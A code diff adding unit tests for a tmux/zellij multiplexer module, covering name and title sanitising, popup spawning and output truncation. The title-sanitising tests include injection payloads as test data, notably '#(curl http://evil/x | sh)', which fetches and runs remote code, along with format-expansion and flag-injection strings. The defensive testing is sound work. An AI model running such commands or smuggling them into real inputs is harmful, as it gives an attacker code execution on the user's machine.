@@ -141,6 +141,239 @@ describe("getMux relaxed-spawn resolution", () => {
   });
 });
 
+describe("safeSegment", () => {
+  it("excludes '.' because tmux target syntax reads it as window.pane", async () => {
+    // Verified against tmux 3.7b: a window named `review.v2` is created fine,
+    // but `select-window -t review.v2` fails with `can't find pane: v2` and
+    // `select-window -t sess:review.v2` fails with `can't find window: review`.
+    // Focus and the copy-paste attach strings would be permanently broken for
+    // any agent whose (model-chosen) name contains a dot.
+    const { safeSegment } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+    expect(safeSegment("Review.v2")).toBe("review-v2");
+    expect(safeSegment("a.b.c")).toBe("a-b-c");
+  });
+
+  it("lower-cases, collapses unsafe runs, and trims dashes", async () => {
+    const { safeSegment } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+    expect(safeSegment("Code Reviewer #2")).toBe("code-reviewer-2");
+    expect(safeSegment("  spaced  out  ")).toBe("spaced-out");
+    expect(safeSegment("keeps_underscores-and-dashes")).toBe(
+      "keeps_underscores-and-dashes",
+    );
+  });
+
+  it("falls back to 'subagent' when nothing survives", async () => {
+    const { safeSegment } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+    expect(safeSegment("...")).toBe("subagent");
+    expect(safeSegment("")).toBe("subagent");
+  });
+});
+
+describe("sanitizeViewerTitle", () => {
+  it("neutralizes tmux format command execution", async () => {
+    // A `display-popup -T` title is a tmux FORMAT: `#(cmd)` spawns a shell job.
+    // Verified against tmux 3.7b — `-T '#(touch /tmp/pwn)'` creates the file,
+    // and with `#` stripped it does not. `shellEscape` cannot help here: tmux
+    // evaluates the format itself, after argv parsing.
+    const { sanitizeViewerTitle } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+    const title = sanitizeViewerTitle("#(curl http://evil/x | sh)");
+    expect(title).not.toContain("#");
+    expect(title).toBe("(curl http://evil/x | sh)");
+  });
+
+  it("neutralizes tmux format expansion", async () => {
+    const { sanitizeViewerTitle } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+    expect(sanitizeViewerTitle("#{pane_pid}")).toBe("{pane_pid}");
+  });
+
+  it("collapses control characters", async () => {
+    const { sanitizeViewerTitle } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+    const title = sanitizeViewerTitle("first\r\nsecond\tthird\u001b[2Jfourth");
+    expect(title).toBe("first second third [2Jfourth");
+  });
+
+  it("strips a leading dash that zellij's clap parser would read as a flag", async () => {
+    // Verified against zellij 0.44.3: `new-pane --floating --name '-rf'` exits
+    // with `Found argument '-r' which wasn't expected`.
+    const { sanitizeViewerTitle } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+    expect(sanitizeViewerTitle("-rf agent")).toBe("rf agent");
+    expect(sanitizeViewerTitle("--force")).toBe("force");
+  });
+
+  it("bounds the title and never yields an empty argument", async () => {
+    const { sanitizeViewerTitle, MAX_VIEWER_TITLE_LENGTH } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+    expect(sanitizeViewerTitle("x".repeat(500))).toHaveLength(
+      MAX_VIEWER_TITLE_LENGTH,
+    );
+    expect(sanitizeViewerTitle("###")).toBe("subagent");
+    expect(sanitizeViewerTitle("   ")).toBe("subagent");
+  });
+});
+
+describe("spawnNativeViewer", () => {
+  it("resolves true once the overlay outlives the spawn grace window", async () => {
+    // `tmux display-popup -E` blocks its caller for the popup's entire lifetime
+    // and the popup waits on `read`, so success cannot mean "the child exited".
+    // It means "the child is still up after the grace window".
+    let capturedArgs: string[] | undefined;
+    vi.doMock("node:child_process", () => ({
+      execFile: (_file: string, args: string[]) => {
+        capturedArgs = args;
+        // Never invoke the callback: the overlay is still open.
+        return { unref: () => {} };
+      },
+      execFileSync: () => "",
+    }));
+    const { spawnNativeViewer } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+
+    await expect(spawnNativeViewer("tmux", ["display-popup"], 5)).resolves.toBe(
+      true,
+    );
+    expect(capturedArgs).toEqual(["display-popup"]);
+  });
+
+  it("resolves false when the backend rejects the request inside the grace window", async () => {
+    vi.doMock("node:child_process", () => ({
+      execFile: (
+        _file: string,
+        _args: string[],
+        callback: (error: Error | null, stdout: string) => void,
+      ) => {
+        callback(new Error("no current client"), "");
+        return { unref: () => {} };
+      },
+      execFileSync: () => "",
+    }));
+    const { spawnNativeViewer } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+
+    await expect(
+      spawnNativeViewer("tmux", ["display-popup"], 1000),
+    ).resolves.toBe(false);
+  });
+
+  it("resolves false when the child cannot be spawned at all", async () => {
+    vi.doMock("node:child_process", () => ({
+      execFile: () => {
+        throw new Error("ENOENT");
+      },
+      execFileSync: () => "",
+    }));
+    const { spawnNativeViewer } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+
+    await expect(
+      spawnNativeViewer("tmux", ["display-popup"], 1000),
+    ).resolves.toBe(false);
+  });
+
+  it("passes no timeout option, so the overlay is never killed mid-read", async () => {
+    // The old implementation passed `{ timeout: 5000 }`: at 5s Node SIGTERM'd
+    // the tmux client, the popup vanished while the user was reading it, and
+    // the UI then claimed native presentation was unavailable.
+    let options: unknown = "not-called";
+    vi.doMock("node:child_process", () => ({
+      execFile: (_file: string, _args: string[], maybeOptions: unknown) => {
+        options = maybeOptions;
+        return { unref: () => {} };
+      },
+      execFileSync: () => "",
+    }));
+    const { spawnNativeViewer } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+
+    await spawnNativeViewer("tmux", ["display-popup"], 5);
+    // Third argument is the callback, never an options object with a timeout.
+    expect(typeof options).toBe("function");
+  });
+});
+
+describe("MUX_CAPABILITIES", () => {
+  it("is keyed by backend name so UI code can gate on state.mux alone", async () => {
+    const { MUX_CAPABILITIES, muxCapabilities } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+    expect(Object.keys(MUX_CAPABILITIES).sort()).toEqual(["tmux", "zellij"]);
+    expect(muxCapabilities("tmux")).toBe(MUX_CAPABILITIES.tmux);
+    expect(muxCapabilities("zellij")).toBe(MUX_CAPABILITIES.zellij);
+  });
+
+  it("is the single source of truth both backends expose", async () => {
+    const { MUX_CAPABILITIES } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+    const { TmuxMultiplexer } = await importFresh<
+      typeof import("../src/multiplexer-tmux")
+    >("../src/multiplexer-tmux");
+    const { ZellijMultiplexer } = await importFresh<
+      typeof import("../src/multiplexer-zellij")
+    >("../src/multiplexer-zellij");
+
+    expect(new TmuxMultiplexer().capabilities).toEqual(MUX_CAPABILITIES.tmux);
+    expect(new ZellijMultiplexer().capabilities).toEqual(
+      MUX_CAPABILITIES.zellij,
+    );
+  });
+});
+
+describe("commandExists", () => {
+  it("probes with a non-login shell", async () => {
+    // `-lc` sources the user's profile on every availability probe: slow, has
+    // side effects, and can report a PATH we don't actually spawn children with.
+    const calls: string[][] = [];
+    vi.doMock("node:child_process", () => ({
+      execFileSync: (_file: string, args: string[]) => {
+        calls.push(args);
+        return "";
+      },
+    }));
+    const { commandExists } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+
+    expect(commandExists("tmux")).toBe(true);
+    expect(calls[0]![0]).toBe("-c");
+    expect(calls[0]).not.toContain("-lc");
+    expect(calls[0]![1]).toBe("command -v 'tmux'");
+  });
+});
+
 describe("boundCaptureOutput UTF-8 safety", () => {
   it("does not start a byte-truncated preview mid-codepoint", async () => {
     const { boundCaptureOutput } =
@@ -169,5 +402,73 @@ describe("boundCaptureOutput UTF-8 safety", () => {
     expect(onLead.output).not.toContain("\uFFFD");
     expect(Buffer.byteLength(onLead.output, "utf8")).toBeLessThanOrEqual(2);
     expect(onLead.output).toBe("é");
+  });
+});
+
+describe("boundCaptureOutput bounds", () => {
+  it("keeps the TAIL of the output — the newest pane lines matter", async () => {
+    const { boundCaptureOutput } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+    expect(
+      boundCaptureOutput("one\ntwo\nthree\nfour", {
+        maxLines: 2,
+        maxBytes: 4096,
+      }),
+    ).toEqual({ output: "three\nfour", truncated: true });
+  });
+
+  it("reports untruncated when the output already fits", async () => {
+    const { boundCaptureOutput } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+    expect(
+      boundCaptureOutput("one\ntwo", { maxLines: 10, maxBytes: 4096 }),
+    ).toEqual({ output: "one\ntwo", truncated: false });
+    // Exactly at the line bound is not truncation.
+    expect(
+      boundCaptureOutput("one\ntwo", { maxLines: 2, maxBytes: 4096 }),
+    ).toEqual({ output: "one\ntwo", truncated: false });
+  });
+
+  it("empties the output when maxLines is zero", async () => {
+    const { boundCaptureOutput } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+    expect(
+      boundCaptureOutput("one\ntwo", { maxLines: 0, maxBytes: 4096 }),
+    ).toEqual({ output: "", truncated: true });
+    // ...but empty input with a zero bound is not "truncated".
+    expect(boundCaptureOutput("", { maxLines: 0, maxBytes: 4096 })).toEqual({
+      output: "",
+      truncated: false,
+    });
+  });
+
+  it("clamps negative and fractional bounds instead of producing garbage", async () => {
+    const { boundCaptureOutput } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+    expect(
+      boundCaptureOutput("one\ntwo", { maxLines: -5, maxBytes: -5 }),
+    ).toEqual({ output: "", truncated: true });
+    expect(
+      boundCaptureOutput("one\ntwo\nthree", { maxLines: 2.9, maxBytes: 4096 }),
+    ).toEqual({ output: "two\nthree", truncated: true });
+  });
+
+  it("applies the byte bound after the line bound", async () => {
+    const { boundCaptureOutput } =
+      await importFresh<typeof import("../src/multiplexer")>(
+        "../src/multiplexer",
+      );
+    // maxLines 2 -> "three\nfour" (10 bytes), then maxBytes 7 -> "ee\nfour".
+    expect(
+      boundCaptureOutput("one\ntwo\nthree\nfour", { maxLines: 2, maxBytes: 7 }),
+    ).toEqual({ output: "ee\nfour", truncated: true });
   });
 });
